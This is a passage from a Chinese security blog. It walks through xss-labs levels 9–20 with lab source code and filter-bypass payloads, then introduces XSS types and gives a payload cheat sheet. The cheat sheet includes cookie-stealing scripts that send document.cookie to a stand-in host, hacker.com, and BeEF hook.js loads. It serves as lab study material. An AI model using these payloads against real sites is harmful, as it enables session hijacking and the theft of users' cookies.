class="line">if(false&#x3D;&#x3D;&#x3D;strpos($str7,&#39;http:&#x2F;&#x2F;&#39;))</span><br><span class="line">&#123;</span><br><span class="line">  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level9.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>构造内容，在响应查找构造的字符串</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417151831245.png" alt="image-20200417151831245"></p>
<p>这次并没有在href中所以在尝试一下script标签</p>
<p>可以看到，双引号颜色不一样</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417152024621.png" alt="image-20200417152024621"></p>
<p>发现这里对url进行了限制，必须包含<code>http://</code></p>
<p>尝试构造<code>javascript:alert(1)http://</code>，居然不对</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417194057445.png" alt="image-20200417194057445"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417194113198.png" alt="image-20200417194113198"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417194649514.png" alt="image-20200417194649514"></p>
<p>确实不对，那该怎么办呢，两</p>
<p>个解决办法：注释或者把http://放到aler()里面</p>
<p>payload：</p>
<p><code>javascr&amp;#x69;pt:alert(1)//http://</code></p>
<p><code>javascr&amp;#x69;pt:alert(&amp;#x22;http://&amp;#x22;)</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417194534225.png" alt="image-20200417194534225"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417194731442.png" alt="image-20200417194731442"></p>
<h4 id="xss-labs第十关"><a href="#xss-labs第十关" class="headerlink" title="xss-labs第十关"></a>xss-labs第十关</h4><p>源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level11.php?keyword&#x3D;good job!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level10&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level10&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 &#x3D; $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22&#x3D;str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33&#x3D;str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form id&#x3D;search&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;t_link&quot;  value&#x3D;&quot;&#39;.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;t_history&quot;  value&#x3D;&quot;&#39;.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;&#39;.$str33.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level10.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>页面中没有任何可以点击输入框，但是url可以输入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417195222663.png" alt="image-20200417195222663"></p>
<p>使用之前闭合查看发现尖括号被过滤，但是这里有三个隐藏的参数，不明白，看看源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417195429986.png" alt="image-20200417195429986"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417195543547.png" alt="image-20200417195543547"></p>
<p>keyword被htmlspecialchars过滤，但是还有一个参数t_sort没有防护，只是过滤了尖括号，然后放到了一个input标签中隐藏起来，如果找不到可以t_link、t_history、t_sort这三个每个都尝试一下，会发现t_sort可以使用</p>
<p>可以闭合双引号，使用<code>onclick</code>事件，然后把隐藏的标签用<code>text</code>方式回显出来即可，最后的payload：<code>?t_sort=&quot; onclick=alert(1) type=&quot;text&quot;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417195733849.png" alt="image-20200417195733849"></p>
<p>成功显示了输入框，使用的onclick，需要单击一下输入框，成功返回</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417195815568.png" alt="image-20200417195815568"></p>
<h4 id="xss-labs第十一关"><a href="#xss-labs第十一关" class="headerlink" title="xss-labs第十一关"></a>xss-labs第十一关</h4><p>查看响应</p>
<p>发现有一个t_ref字段是http referer的值，可能存在xss注入点</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418085345849.png" alt="image-20200418085345849"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418085849316.png" alt="image-20200418085849316"></p>
<p>因为是referer所以需要使用burp抓包，然后修改referer的参数</p>
<p>修改前的参数</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418090943906.png" alt="image-20200418090943906"></p>
<p>修改后的参数</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418091152599.png" alt="image-20200418091152599"></p>
<p>修改完放行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418091254595.png" alt="image-20200418091254595"></p>
<p>点击输入框，成功弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418091314306.png" alt="image-20200418091314306"></p>
<h4 id="xss-labs第十二关"><a href="#xss-labs第十二关" class="headerlink" title="xss-labs第十二关"></a>xss-labs第十二关</h4><p>下查看响应</p>
<p>可以看到t_ua是http  User-Agent的值。所以还是需要抓包修改</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418092006907.png" alt="image-20200418092006907"></p>
<p>进行抓包，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418092823329.png" alt="image-20200418092823329"></p>
<p>成功弹出弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418092306031.png" alt="image-20200418092306031"></p>
<h4 id="xss-labs第十三关"><a href="#xss-labs第十三关" class="headerlink" title="xss-labs第十三关"></a>xss-labs第十三关</h4><p>查看响应</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418093556616.png" alt="image-20200418093556616"></p>
<p>跟前两关一样，直接使用burp抓包，修改cookie的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418095753042.png" alt="image-20200418095753042"></p>
<p>进行放行，单击箭头处的英文</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418095842868.png" alt="image-20200418095842868"></p>
<p>页面成功弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418100012077.png" alt="image-20200418100012077"></p>
<h4 id="xss-labs第十四关"><a href="#xss-labs第十四关" class="headerlink" title="xss-labs第十四关"></a>xss-labs第十四关</h4><p>登不上，可以直接看先知上的wp了解exif xss</p>
<p><a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12" target="_blank" rel="noopener">https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12</a></p>
<h4 id="xss-labs第十五关"><a href="#xss-labs第十五关" class="headerlink" title="xss-labs第十五关"></a>xss-labs第十五关</h4><p>查看响应</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418102611400.png" alt="image-20200418102611400"></p>
<ul>
<li>这题有angular js，然后ng-include相当于php的include函数，然后src参数被转义了，最终我们可以include leve1然后再用img标签传xss(这里我用firefox打不成功，但是换chrome就可以了)</li>
</ul>
<p>payload：<code>?src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;</code></p>
<p>页面成功返回</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418102458614.png" alt="image-20200418102458614"></p>
<h4 id="xss-labs第十六关"><a href="#xss-labs第十六关" class="headerlink" title="xss-labs第十六关"></a>xss-labs第十六关</h4><p>查看源码</p>
<p>发现对script、/、空格进行了转换，需要进行绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;这只是截取了其中的php代码</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;&#x2F;&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;&#x2F;center&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>查看响应</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418131112382.png" alt="image-20200418131112382"></p>
<p>采用回车符%0a进行绕过,触发payload。</p>
<p>payload：<code>&lt;a%0atype=&quot;text&quot;%0aonclick=&quot;alert(1)&quot;&gt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418131643401.png" alt="image-20200418131643401"></p>
<p>提交之后点击图片弹出弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418131703210.png" alt="image-20200418131703210"></p>
<h4 id="xss-labs第十七关"><a href="#xss-labs第十七关" class="headerlink" title="xss-labs第十七关"></a>xss-labs第十七关</h4><p>查看响应，发现两个输出点</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418132402889.png" alt="image-20200418132402889"></p>
<p>可以在这两个输出点上进行尝试</p>
<p>payload：<code>onmouseover=alert(1)</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418132611943.png" alt="image-20200418132611943"></p>
<p>因为用的是onmouseover所以当鼠标放到图片上时会触发xss从而执行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418132656388.png" alt="image-20200418132656388"></p>
<h4 id="xss-labs第十八关"><a href="#xss-labs第十八关" class="headerlink" title="xss-labs第十八关"></a>xss-labs第十八关</h4><p>和上一关相同</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418151906701.png" alt="image-20200418151906701"></p>
<p>payload：<code>onmouseover=alert(1)</code></p>
<p>在地址栏输入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418152112711.png" alt="image-20200418152112711"></p>
<p>鼠标放到黑色的图片上，弹出弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418152128213.png" alt="image-20200418152128213"></p>
<h4 id="xss-labs第十九关"><a href="#xss-labs第十九关" class="headerlink" title="xss-labs第十九关"></a>xss-labs第十九关</h4><p>flash xss，涉及到反编译，没研究明白</p>
<h4 id="xss-labs第二十关"><a href="#xss-labs第二十关" class="headerlink" title="xss-labs第二十关"></a>xss-labs第二十关</h4><p>flash xss，涉及到反编译，没研究明白</p>
</script></li></ul>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-XSS" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/04/20/XSS/" class="article-date">
  	<time datetime="2020-04-20T01:00:48.651Z" itemprop="datePublished">2020-04-20</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/20/XSS/">
        XSS
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="XSS介绍"><a href="#XSS介绍" class="headerlink" title="XSS介绍"></a>XSS介绍</h4><p>跨站脚本(Cross-Site Scripting跨域脚本攻击，简称为XSS)是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。他允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响。恶意用户利用XSS代码攻击成功后，可能得到很高的权限(如执行一些操作)、私密网页内容、会话和cookie等各种内容</p>
<h5 id="XSS原因："><a href="#XSS原因：" class="headerlink" title="XSS原因："></a>XSS原因：</h5><p>过于信任客户端提交的数据</p>
<ul>
<li><h5 id="XSS攻击可分为三种：反射性，存储型，DOM型"><a href="#XSS攻击可分为三种：反射性，存储型，DOM型" class="headerlink" title="XSS攻击可分为三种：反射性，存储型，DOM型"></a>XSS攻击可分为三种：反射性，存储型，DOM型</h5></li>
</ul>
<h4 id="XSS漏洞原理"><a href="#XSS漏洞原理" class="headerlink" title="XSS漏洞原理"></a>XSS漏洞原理</h4><h5 id="1、反射性XSS"><a href="#1、反射性XSS" class="headerlink" title="1、反射性XSS"></a>1、反射性XSS</h5><p>​        反射性XSS又称为<strong>非持久性XSS</strong>，这种攻击方式往往只具有<strong>一次性</strong></p>
<p>​        攻击方式：攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问连接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会出发XSS漏洞</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200409091025553.png" alt="image-20200409091025553"></p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	echo $_GET[&quot;uname&quot;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>当用户访问<code>url?uname=&lt;script&gt;alert(&quot;hello&quot;);&lt;/script&gt;</code>触发代码弹出对话框</p>
<p>随便输入内容，会返回输入的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408195920593.png" alt="image-20200408195920593"></p>
<p>使用<code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code>查看页面返回，成功返回cookie值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408200115396.png" alt="image-20200408200115396"></p>
<h5 id="2、存储型XSS"><a href="#2、存储型XSS" class="headerlink" title="2、存储型XSS"></a>2、存储型XSS</h5><p>​        存储型XSS又称为<strong>持久性XSS</strong>，攻击脚本将被永远地存放在目标服务器的数据库或文件中，具有很高的隐秘性</p>
<p>​        攻击方式：这种攻击多见于论坛、博客、和留言版，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子中，随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其他用户浏览这个被注入的恶意脚本帖子时，恶意脚本会在他们的浏览器中得到执行。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200409091124829.png" alt="image-20200409091124829"></p>
<p>​        例如，恶意攻击这在留言板中加入以下代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x2F;hacker by hacker&#x2F;)&lt;&#x2F;script&gt;)</span><br></pre></td></tr></table></figure>

<p>当其他用户访问留言板时，就会看到一个弹窗。可以看到，存储型XSS的攻击方式能够将恶意代码永久地嵌入到一个页面中，所有访问这个页面的用户都将成为受害者。</p>
<p>在name处输入hello，或者其他任何都行，在Message输入XSS代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408201711023.png" alt="image-20200408201711023"></p>
<p>点击Sign Guestbook，返回cookie值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408201852944.png" alt="image-20200408201852944"></p>
<p>刷新页面或者切换别的模式在回来点还是弹出cookie信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408201946633.png" alt="image-20200408201946633"></p>
<h5 id="3、DOM型XSS"><a href="#3、DOM型XSS" class="headerlink" title="3、DOM型XSS"></a>3、DOM型XSS</h5><p>​        DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。<br>​        DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。<br>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p>
<p>​        <strong>HTML的标签都是节点</strong>，而这些节点组成了DOM的整体结构—<strong>节点树。</strong>通过HTML DOM，树中的所有节点均可通过JavaScript进行访问。所有HTML元素(节点)均可被修改，也可以创建或删除节点，<strong>HTML DOM树结构</strong></p>
<p><img src="https://upload-images.jianshu.io/upload_images/2461408-afb50bde75195453.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/508" alt="img"></p>
<p>查看DMO XSS 选择一个类型进行上传</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408210507911.png" alt="image-20200408210507911"></p>
<p>发现URL改变了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408210534686.png" alt="image-20200408210534686"></p>
<p>在括号处更改值，例如改为123，然后回车，发现下拉选项框中出现了123</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408210612217.png" alt="image-20200408210612217"></p>
<h4 id="构造XSS脚本"><a href="#构造XSS脚本" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h4><h5 id="常用HTML标签"><a href="#常用HTML标签" class="headerlink" title="常用HTML标签"></a>常用HTML标签</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe&gt;	ifranme 元素会创建包含另一个文档的内联框架(即行内框架)</span><br><span class="line">&lt;textarea&gt;	&lt;textarea&gt;标签定义多行的文本输入控件</span><br><span class="line">&lt;img&gt;		img元素像网页中嵌入一幅图像</span><br><span class="line">&lt;script&gt;	&lt;script&gt; 标签用于定义客户端脚本，如果JavaScript。</span><br><span class="line">			script 元素既可以包含脚本语句，也可以通过src 属性指向外部脚本文件</span><br><span class="line">			必须的 type 属性规定脚本的MIME类型。</span><br><span class="line">			JavaScript 的常见应用时图片操作、表单验证以及动态内容更新</span><br></pre></td></tr></table></figure>

<h5 id="常用的JavaScript方法"><a href="#常用的JavaScript方法" class="headerlink" title="常用的JavaScript方法"></a>常用的JavaScript方法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alert				alert()方法用于显示带有一条指定信息和一个按钮的警告框</span><br><span class="line">window.loaction		window.loaction对象用于获得当前页面的地址(URL),并把浏览器重定向到新的页面</span><br><span class="line">location.href		返回当前显示的文档的完整 URL</span><br><span class="line">onload				一张页面或一幅图像完成加载</span><br><span class="line">onsubmit			确认按钮被点击</span><br><span class="line">onerror				在加载文档或图片时发生错误</span><br></pre></td></tr></table></figure>

<h5 id="构造XSS脚本-1"><a href="#构造XSS脚本-1" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">弹窗警告</span><br><span class="line">此脚本实现弹窗提示，一般作为漏洞测试或者演示使用，类似sql注入漏洞测试中的&#39;单引号，一旦此脚本能执行，也就意味着后端服务器没有对特殊符号进行过滤&lt;&gt;&#x2F;&#39;这样就可以证明，这个页面位置存在了XSS漏洞。</span><br><span class="line">&lt;script&gt;alert(&#39;xss&#39;);&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">页面嵌套</span><br><span class="line">&lt;iframe src&#x3D;http:&#x2F;&#x2F;www.baidu.com width&#x3D;300 height&#x3D;300&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">&lt;iframe src&#x3D;http:&#x2F;&#x2F;www.baidu.com width&#x3D;0 height&#x3D;0&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line"></span><br><span class="line">页面重定向</span><br><span class="line">&lt;script&gt;window.location&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;www.qfedu.com&quot;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">弹框警告并重定向</span><br><span class="line">&lt;script&gt;alert(&quot;请移步到我们的新站&quot;);location.href&#x3D;&quot;http:&#x2F;&#x2F;www.qfedu.com&quot;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;alert(&#39;xss&#39;);location.href&#x3D;&quot;http:&#x2F;&#x2F;www.127.0.0.1&#x2F;upload&#x2F;5.txt&quot;&lt;&#x2F;script&gt;</span><br><span class="line">这里结合了一些社工的思路，例如：通过网站内部私信的方式将其发送给其他用户，如果其他用户点击并且相信了这个信息，则可能在另外的站点重新登录账户，(克隆网站收集账户)</span><br><span class="line"></span><br><span class="line">访问恶意代码</span><br><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;www.qfedu.com&#x2F;xss.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;BeEF_IP:3000&#x2F;hook.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">当别人看到script是脚本，脚本想想就是不好的，这样就可以巧妙运用图片标签了</span><br><span class="line">巧用图片标签</span><br><span class="line">&lt;img src&#x3D;&quot;#&quot; onerror&#x3D;laert(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;javascript:Falert(&#39;xss&#39;);&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;BeEF_IP:3000&#x2F;hook.js&quot;&gt;&lt;&#x2F;img&gt;</span><br><span class="line"></span><br><span class="line">绕开过滤的脚本</span><br><span class="line">大小写		&lt;ScrIpT&gt;alert(&#39;xss&#39;)&gt;&lt;&#x2F;ScrIpT&gt;</span><br><span class="line">字符编码采用URL、Base64等编码</span><br><span class="line"></span><br><span class="line">收集用户cookie</span><br><span class="line">打开新窗口并采用本地cookie访问目标网页。</span><br><span class="line">&lt;script&gt;window.open(&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&quot;+document.cookie)&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;document.location&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php</span><br><span class="line">cookie&#x3D;&quot;+document.cookie&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;new Image().src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&quot;+document.cookie&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&#39;+document.cookie&quot;&gt;&lt;&#x2F;img&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&#39;+document.cookie&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>

<h4 id="自动化XSS"><a href="#自动化XSS" class="headerlink" title="自动化XSS"></a>自动化XSS</h4><h5 id="BeEF介绍"><a href="#BeEF介绍" class="headerlink" title="BeEF介绍"></a>BeEF介绍</h5><p>BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配合Metasploit进行渗透；</p>
<p>BeEF是基于Ruby语言编写的，并且支持图形化界面，操作简单</p>
<p><a href="http://beefprohect.com/" target="_blank" rel="noopener">http://beefprohect.com/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">信息搜集：</span><br><span class="line">1、网络发现</span><br><span class="line">2、主机信息</span><br><span class="line">3、Cookie获取</span><br><span class="line">4、会话劫持</span><br><span class="line">5、键盘记录</span><br><span class="line">6、插件信息</span><br><span 